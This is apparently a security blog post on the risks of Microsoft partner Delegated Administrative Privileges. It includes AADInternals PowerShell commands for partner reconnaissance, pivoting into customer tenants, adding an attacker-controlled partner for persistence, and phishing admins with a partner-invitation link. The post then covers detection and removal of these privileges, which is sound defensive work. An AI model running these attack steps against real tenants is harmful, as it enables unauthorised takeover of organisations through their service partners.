+++
title = "Microsoft partners: The Good, The Bad, or The Ugly?"
date = "2021-12-11"
lastmod = "2022-02-15"
categories =["blog"]
tags = ["Azure Active Directory","partner"]
thumbnail = "/images/posts/partners.png"
+++

In 2018, I <a href="/post/o365-gdpr/#delegated-administration" target="_blank">blogged</a> first time about risks related to Delegated Administrative Privileges (DAP) given to Microsoft partners. 
Now, in 2021, Microsoft <a href="https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/" target="_blank">blogged</a> how NOBELIUM exploited DAP to compromise
customers of some Microsoft partners.

In this blog, I'll explain why DAP is so dangerous, how to exploit it, how to detect exploitation, and how to view partner related information with **AADInternals v0.6.5**.

<!--more-->
# Introduction

According to Microsoft <a href="https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners" target="_blank">documentation</a>, partners has different types to choose from when working with their customers. In this blog, we are focusing on **Delegated administrator partners**.

Partner type|Description
---|---
Reseller|Partners that sell Microsoft products to your organization or school.
**Delegated administrator**|**Partners that manage products and services for your organization or school. In Azure Active Directory (AD), the partner is a Global Administrator for your tenant. This role lets them manage services like creating user accounts, assigning and managing licenses, and password resets.**
Reseller & delegated administrator|Partners that sell and manage Microsoft products and services to your organization or school.
Partner|You give your partner a user account in your tenant, and they work with other Microsoft services on your behalf.
Advisor|Partners can reset passwords and handle support incidents for you.
Microsoft Products & Services Agreement (MPSA) partner|If you've worked with multiple partners through the MPSA program, you can allow them to see purchases made by each other.
Line-of-business (LOB) partner|Partners can develop, submit, and manage LOB apps specific for your organization or school.

**Delegated Administrative Privileges (DAP)** is a way to "outsource" administrative tasks to a Microsoft partner you trust. DAP can be included in a "contract" between a partner and a customer, which the partner offers and the customer accepts:

![Partners](/images/posts/partners_02.png)

After the partner's contract offer (including DAP) is accepted by the customer, the partner has rights to administer customer's tenant. By default, partner will have <a href="https://docs.microsoft.com/en-us/partner-center/customers-revoke-admin-privileges#delegated-admin-privileges-in-azure-ad" target="_blank">two roles</a>: **Global administrator** and **Helpdesk admistrator**.
These roles can be assigned to users of the Partner organisation in Partner's tenant. In Partner center, these roles are called **Admin agent** and **Heldesk agent**:

![Partners](/images/posts/partners_03.png)

The problem here is that you can't limit partner users' access to a certain tenant. 
That means that after assigning for example the **Admin agent** role to user of Partner tenant, that user has **Global administrator access to all customers of the parter**! 

**Note:** Microsoft announced in November 2021 <a href="https://docs.microsoft.com/en-us/partner-center/announcements/2021-november#5" target="_blank">granular delegated admin priviliges (GDAP)</a> coming out in early 2022, which should address these issues. 


![Partners](/images/posts/partners_01.png)

From the customer point-of-view, this is a huge problem as customers don't have access to partner organisations. In practice, the customer doesn't know how many Global administrators they have.
For instance, in a figure above, the Customer C can have any number of Global administrators from Partner A and B tenants. This alone is violating many data-protection laws, including <a href="/images/posts/Syynimaa & Viitanen (2018). Is my Office 365 GDPR Compliant Security Issues in Authentication and Administration.pdf" target="_blank">GDPR</a>.

So, what's the big deal with the DAP then? Well, instead of trying to breach multiple organisations, threat actors can focus on breaching one partner organisation. After that, threat actors has open doors to all customer tenants of the partner.



# Accessing partner information

Let's next see how the partner information and relationships can be viewed in Partner and Customer tenants.

## Partners

Partners can access all partner information at the Microsoft Partner Center at https://partner.microsoft.com/dashboard/home

### Partner account identifiers

Partners can manage and view their partner IDs and locations at https://partner.microsoft.com/en-us/dashboard/account/v3/organization/identity

![Partners](/images/posts/partners_05.png)

For the reasons unknown, this information (and all seen above) is available also for normal users, withouth admin permissions or rights to Microsoft Partner Center.

**Note!** This behaviour has been reported to Microsoft (and later publicly shared) earlier in 2021 by another individual.

Threat actors can't use this information directly for attacks, but contains a lot of interesting intel for social engineering and phishing purposes..

To get the list of Partner locations with AADInternals:
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForMSPartner -SaveToCache

# List the partner organisations
Get-AADIntMSPartnerOrganizations
{{< /highlight>}}

```
id             : 9a0c7346-f305-4646-b3fb-772853f6b209
typeName       : Tenant
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 60a0020f-bd16-4f27-a23c-104644918834
typeName       : PartnerGlobal
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559542
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 297588a4-5c2a-430e-ae1e-b16c5d944a7d
typeName       : PartnerLocation
name           : Partner Ltd, US, PARTNERVILLE
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}
```

### Customer list

The most important information for threat actors would be to know the customers of the tenant. To view customers, the type of relationship, and links to administer their services, just browse to https://partner.microsoft.com/en-us/dashboard/commerce2/customers/list

![Partners](/images/posts/partners_04.png)


To access Microsoft Partner Center, the user must have been given permissions to use it. 

However, luckily, the good old **MSOnline** PowerShell module have provided the same information since the beginning of times - without any admin rights or permissions to Microsoft Partner Center! This is now included also in AADInternals.

To view partner's customers with AADInternals:
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAADGraph -SaveToCache 

# List the partner's customer organisations
Get-AADIntMSPartnerContracts
{{< /highlight>}}

```
CustomerName     CustomerTenantId                     CustomerDefaultDomain   ContractType           
------------     ----------------                     ---------------------   ------------           
Company          dad33f16-69d1-4e32-880e-9c2d21aa3e59 company.com             SupportPartnerContract 
Contoso          936b7883-4746-4b89-8bc4-c8128795cd7f contoso.onmicrosoft.com ResellerPartnerContract
Adatum           17427dcd-8d61-4c23-9c68-d1f34975b420 adatum.com              SupportPartnerContract 
```
And voilà, there's the list of organisations this partner can administer!



## Customers

Customer's admins can view the list of partners and remove their admin rights at https://admin.microsoft.com/Adminportal/Home?source=applauncher#/partners

![Partners](/images/posts/partners_06.png)

Unfortunately, this information is not available for normal users.

To view partners with AADInternals:
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# List the partners
Get-AADIntMSPartners
{{< /highlight>}}

```
Identity         : b1f6d5cc-f1d3-41d9-b88c-1d177aaf171b
DisplayName      : Partner Ltd
Email            : pmanager@company.com
Website          : http://www.company.com
Phone            : +1234567890
Relationship     : Indirect Reseller and Admin
TypeDetail       : PartnerAdmin
CanDelete        : False
CanRemoveDap     : True
AllDataRetrieved : True
```

# Exploiting

Let's jump to the shoes of threat actor: How can we exploit all what we have learned?

## Finding a partner

First step for a threat actor is to find suitable partners to target. Microsoft has made this easy, as you can search
for partners at <a href="https://appsource.microsoft.com/en-us/marketplace/partner-dir" target="_blank">AppSource</a> portal.

AADInternals makes this even more easy:

{{< highlight powershell >}}
# Find the first 20 MSP partners from Finland
Find-AADIntMSPartners -Country FI -MaxResults 20 -Services 'Managed Services (MSP)' | Sort CompanyName
{{< /highlight>}}

**Output:**
```
Estimated total matches: 511

TenantId                             CompanyName                  Country Address                                    
--------                             -----------                  ------- -------                                    
b3665057-2eaa-4fa7-9f45-c4a17f405fb6 Atea Finland Oy              FI      @{country=FI; region=Europe; city=Vantaa...
cf36141c-ddd7-45a7-b073-111f66d0b30c Avanade Inc.                 FI      @{country=FI; region=Europe; city=Porkka...
12f4ed76-f694-4b1e-9b57-c3849eea3f6c CANORAMA OY AB               FI      @{country=FI; region=Europe; city=Seinäj...
72b4c351-3bb3-45f1-91e4-9b2b1364f0d8 Capgemini Finland Oy         FI      @{country=FI; region=Europe; city=ESPOO;...
bff3224c-767a-4628-8c53-23a4df13a03c CloudNow IT Oy               FI      @{country=FI; region=Europe; city=Vantaa...
e157e107-0a76-4b3d-ba88-fe07cc786112 Crayon Oy                    FI      @{country=FI; region=Europe; city=Helsin...
93f33571-550f-43cf-b09f-cd331338d086 DXC Technology Services LLC. FI      @{country=FI; region=Europe; city=Espoo;...
d11dbe02-4edd-4edf-882f-dc2431a03ada ELISA OYJ                    FI      @{country=FI; region=Europe; city=HELSIN...
028f2339-46fc-4134-a44a-e1412faa38eb Enfo Oyj                     FI      @{country=FI; region=Europe; city=Kuopio...
d944c18e-fb3f-4f60-bd8b-ce7a27ff9df9 Fujitsu Finland Oy           FI      @{country=FI; region=Europe; city=Helsin...
189de737-c93a-4f5a-8b68-6f4ca9941912 HCL TECHNOLOGIES LIMITED     FI      @{country=FI; region=Europe; city=Espoo;...
1d3bdd24-8ca7-4b5a-9984-6d3cd45ee2c4 Henson Group                 FI      @{country=FI; region=Europe; city=Tamper...
7c0c36f5-af83-4c24-8844-9962e0163719 Hexaware Technologies        FI      @{country=FI; region=Europe; city=Helsin...
99ebba89-0dd9-4b7b-8f23-95339d2a81e1 IBM                          FI      @{country=FI; region=Europe; city=Helsin...
f8407946-d2c1-4fcc-ae95-63723ace3665 IBM Nordcloud EMEA           FI      @{country=FI; region=Europe; city=Jyväsk...
0a4d4529-3bd8-41d2-bdbe-aa4634a1752b Infopulse Ukraine LLC        FI      @{country=FI; region=Europe; city=Helsin...
4b1f17f7-26f6-4624-a58c-2bc917bae8f3 Intercept                    FI      @{country=FI; region=Europe; city=Espoo;...
d975d022-a4d5-40ca-ba77-d6a8c8dbfe9b Midpointed Ltd               FI      @{country=FI; region=Europe; city=Helsin...
7bb1a8e5-59ee-489d-86f5-a50210ae3970 Solita Oy                    FI      @{country=FI; region=Europe; city=HELSIN...
779fd0ca-9067-49da-8991-9cde176b7f1d Tietokeskus Finland Oy       FI      @{country=FI; region=Europe; city=TAMPER...
```

 

## Attacking partner's customers

Next step is to get a foothold to a partner tenant. There are multiple techniques for this, such as <a href="/post/phishing" target="_blank">phishing</a>, brute-forcing, or on-prem attacks (<a href="/post/adfs" target="_blank">Golden SAML</a>).

At this point, any user account will do, as after getting the access, we can run AADInternals' recon tool:
{{< highlight powershell >}}
# Get accesstoken
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Invoke the reconnaissance and save results to a variable
$results = Invoke-AADIntReconAsInsider
{{< /highlight>}}
Output:
```
Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
Directory sync enabled?      true
CA policies:                 8
MS Partner IDs:              8559542,8559543
MS Partner DAP enabled?      True
MS Partner contracts:        3
MS Partners:                 1
```

This reveals that we have indeed accessed a partner organisation, having 3 customers. We can now list the customers:
{{< highlight powershell >}}
# List the customers
$recon.partnerContracts
{{< /highlight>}}

```
CustomerName     CustomerTenantId                     CustomerDefaultDomain   ContractType           
------------     ----------------                     ---------------------   ------------           
Company          dad33f16-69d1-4e32-880e-9c2d21aa3e59 company.com             SupportPartnerContract 
Contoso          936b7883-4746-4b89-8bc4-c8128795cd7f contoso.onmicrosoft.com ResellerPartnerContract
Adatum           17427dcd-8d61-4c23-9c68-d1f34975b420 adatum.com              SupportPartnerContract 
```

Next step is to list users who has **Admin Agent** or **Helpdesk Agent** roles:

{{< highlight powershell >}}
# List users with Admin Agent role
$recon.partnerRoleInformation | where Name -eq "Admin Agent" | select -ExpandProperty Members
{{< /highlight>}}

```
displayName      userPrincipalName                    
-----------      -----------------                    
Admin User      admin@company.onmicrosoft.com
Diego Siciliani DiegoS@contoso.com
Alex Wilber     AlexW@contoso.com
```

And now we have found the target users! 

The next step is to sign-in to the Microsoft Partner Center as the target user, or use **MSOnline** PowerShell module:
{{< highlight powershell >}}
# Connect to partner tenant
Connect-MsolService

# Use any MSOnline cmdlet with -TenantId parameter!
Get-MsolCompanyInformation -TenantId dad33f16-69d1-4e32-880e-9c2d21aa3e59
{{< /highlight>}}

You can also use most of the **AADInternals** functions:
{{< highlight powershell >}}
# Get access token for the customer's tenant
Get-AADIntAccessTokenForAADGraph -SaveToCache -Tenant dad33f16-69d1-4e32-880e-9c2d21aa3e59

# Show company information
Get-AADIntCompanyInformation
{{< /highlight>}}
```
AllowAdHocSubscriptions                  : true
AllowEmailVerifiedUsers                  : true
AuthorizedServiceInstances               : AuthorizedServiceInstances
AuthorizedServices                       : 
City                                     : 
CompanyDeletionStartTime                 : 
CompanyTags                              : CompanyTags
CompanyType                              : CompanyTenant
CompassEnabled                           : 
Country                                  : 
CountryLetterCode                        : US
DapEnabled                               : 
DefaultUsageLocation                     : 
DirSyncAnchorAttribute                   : mS-DS-ConsistencyGuid
DirSyncApplicationType                   : 1651564e-7ce4-4d99-88be-0a65050d8dc3
DirSyncClientMachineName                 : SERVER
DirSyncClientVersion                     : 1.4.38.0
DirSyncServiceAccount                    : Sync_SERVER1_xxxxxxxxxxx@company.onmicrosoft.com
DirectorySynchronizationEnabled          : true
DirectorySynchronizationStatus           : Enabled
DisplayName                              : Company Ltd
InitialDomain                            : company.onmicrosoft.com
LastDirSyncTime                          : 2020-08-03T15:29:34Z
LastPasswordSyncTime                     : 2020-08-03T15:09:07Z
MarketingNotificationEmails              : 
MultipleDataLocationsForServicesEnabled  : 
ObjectId                                 : 527e940d-2526-483b-82a9-d5b6bf6cc165
PasswordSynchronizationEnabled           : true
PortalSettings                           : PortalSettings
PostalCode                               : 
PreferredLanguage                        : en
ReleaseTrack                             : FirstRelease
ReplicationScope                         : NA
RmsViralSignUpEnabled                    : true
SecurityComplianceNotificationEmails     : 
SecurityComplianceNotificationPhones     : 
SelfServePasswordResetEnabled            : true
ServiceInformation                       : ServiceInformation
ServiceInstanceInformation               : ServiceInstanceInformation
State                                    : 
Street                                   : 
SubscriptionProvisioningLimited          : false
TechnicalNotificationEmails              : TechnicalNotificationEmails
TelephoneNumber                          : 1324567890
UIExtensibilityUris                      : 
UsersPermissionToCreateGroupsEnabled     : true
UsersPermissionToCreateLOBAppsEnabled    : true
UsersPermissionToReadOtherUsersEnabled   : true
UsersPermissionToUserConsentToAppEnabled : true
WhenCreated                              : 2019-07-14T07:03:20Z
```

## Adding a new partner to compromised organisation

One way to achieve persistent access to already compromised organisation is to add a partner tenant that is controlled by the threat actor.

With Global admin level access to compromised organisation, AADInternals can be used to easily add new partners. You just need to know any domain name or tenant id of the partner.

{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# Assign DAP for the given partner
Approve-AADIntMSPartnerDelegatedAdminRequest -Domain "partner.com"
{{< /highlight>}}

```
responseCode message
------------ -------
success 
```

## Compromising new customers

The example above requires Global administrator access to customer's tenant. But what if we don't have the needed access?
The answer is to create a link for approving the partner offer and then lure target organisation administrator to accept that. 

Again, all you need to know is any domain name or tenant id of the partner.

{{< highlight powershell >}}
# Create the delegated admin request for the given partner tenant
New-AADIntMSPartnerDelegatedAdminRequest -TenantId c7e52a77-e461-4f2e-a652-573305414be9
{{< /highlight>}}

```
https://admin.microsoft.com/Adminportal/Home?invType=Administration&partnerId=c7e52a77-e461-4f2e-a652-573305414be9#/BillingAccounts/partner-invitation
```

Now the link can be sent to any target organisations 😊

# Detecting

## Partner accessing customer organisation

### Microsoft Partner Center and API access
If the partner is accessing customers services from the Microsoft Partner Center, the login event will be shown in customer's **sign-ins (interactive)** log:

![Partners](/images/posts/partners_08.png)

As we can see, the user name is actually "<Partner tenant name> technician", and the last part of IP address is redacted. When the event is expanded, we can also see the actual user name:

![Partners](/images/posts/partners_09.png)

In partner's tenant, we can see the same event with the same **Request ID**:

![Partners](/images/posts/partners_10.png)

Some events are also seen in customer's **sign-ins (non-interactive)** log:

![Partners](/images/posts/partners_11.png)

### PowerShell access

If the parter (or threat actor) is using **MSOnline** PowerShell module, sign-in events are not logged anywhere! 
This means that threat actor can, for instance, dump the whole content of customer's Azure Active Directory without a fear of getting caught 🤦‍

However, all modifications are logged normally to customer's **Audit logs**:

![Partners](/images/posts/partners_13.png)

## Adding new partners

Whenever a new partner is added to the organisation, there will be an event in the **Audit Logs**:

![Partners](/images/posts/partners_07.png)

# Preventing/mitigating

## Partner accessing customer organisation

Microsoft announced in November 2021 a new more granular DAP called GDAP, which will allow partners to have more granular and time-bound access to their customers. 
Microsoft Threat Intelligence Center (MSTIC) <a href="https://docs.microsoft.com/en-us/partner-center/announcements/2021-november#details-16" target="_blank">recommends</a> partners to move using GDAP:

> We highly recommend moving away from the current DAP model (which gives admin agents standing or perpetual global admin access) to a fine-grained delegated access model. The fine-grained delegated access model **reduces the security risk to customers**, and the impact on them as well. It also gives you control and flexibility to restrict access per customer at the workload level of your employees who are managing your customers' services and environments. 

While GDAP will reduce risk, it doesn't remove it completely. The only way to prevent this is **to get rid off all DAP permissions** - which I urge everyone to do immediately! 



But what does this mean in practice? According to Microsoft <a href="https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners?view=o365-worldwide#remove-partner-admin-roles" target="_blank">documentation</a>:

> You can remove admin roles from a partner at any time. **Removing the admin roles doesn’t remove the partner relationship.** They can still work with you in a different capacity, such as a Reseller. If you decide that you don’t want to work with a partner anymore, contact your partner to end the relationship.

This means that you can safely remove DAP roles, it has no effect on other type of relationships. However, as pointed by Petr Vlk (<a href="https://twitter.com/Kazzan" target="_blank">@Kazzan</a>), DAP is <a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-requirements" target="_blank">required</a> by 
<a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-overview" target="_blank">Microsoft Office 365 Lighthouse</a>, an admin portal for Managed Service Providers (MSPs) for managing at scale multiple SMB organisations.

My standpoint is always the security of customers, which overrules the business benefits of partners. Therefore, the correct (secure) way to give partners access to your tenant is to create them accounts that you manage.

Customer's Global administrators can remove DAP at https://admin.microsoft.com/Adminportal/Home?source=applauncher#/partners:
![Partners](/images/posts/partners_14.png)

![Partners](/images/posts/partners_15.png)

![Partners](/images/posts/partners_16.png)


To remove DAP with **AADInternals** as customer's Global administrator:
{{< highlight powershell >}}
# Get access tokens and save to cache
Get-AADIntAccessTokenForMSPartner -SaveToCache
Get-AADIntAccessTokenForAdmin -SaveToCache

# Remove DAP from all partners
Get-AADIntMSPartners | %{Remove-AADIntMSPartnerDelegatedAdminRoles -TenantId $_.Identity}
{{< /highlight>}}

```
responseCode message
------------ -------
success 
success 
success 
```

## Adding new partners

Only way to prevent this is to minimise the number or Global administrators, and/or allowing them to access Azure AD only from Pivileged Access Workstations (PAWs).



# Summary

Delegated Administrative Privileges (DAP) are dangerous and out-dated way to give administrator access to your tenant for your partners or service providers. 

Threat actors are targeting partner organisations as compromising a single partner tenant gives them access to all partner's customers too.

I suggest all admins to remove all DAP permissions to secure their tenants. Removing DAP doesn't remove the partner relationship, so it doesn't affect any licensing contracts you may have. 
This does, however, remove all partner access via PowerShell and APIs, including Microsoft 365 Lighthouse.

If you need to give admin access to your partners, create a dedicated accounts for each partner (and user) to your tenant so that you can manage the accounts.

# References
* Microsoft: <a href="https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/" target="_blank">NOBELIUM targeting delegated administrative privileges to facilitate broader attacks</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners" target="_blank">Manage partner relationships</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/partner-center/customers-revoke-admin-privileges#delegated-admin-privileges-in-azure-ad" target="_blank">Delegated admin privileges in Azure AD</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-requirements" target="_blank">Requirements for Microsoft 365 Lighthouse</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-overview" target="_blank">Overview of Microsoft 365 Lighthouse</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/partner-center/announcements/2021-november#5" target="_blank">Coming in early 2022: granular delegated admin privileges (GDAP)</a>
* Syynimaa, N. and Viitanen, T. (2018). <a href="/images/posts/Syynimaa & Viitanen (2018). Is my Office 365 GDPR Compliant Security Issues in Authentication and Administration.pdf" target="_blank">Is My Office 365 GDPR Compliant? - Security Issues in Authentication and Administration</a>. In Proceedings of the 20th International Conference on Enterprise Information Systems - Volume 2: ICEIS, ISBN 978-989-758-298-1; ISSN 2184-4992, pages 299-305.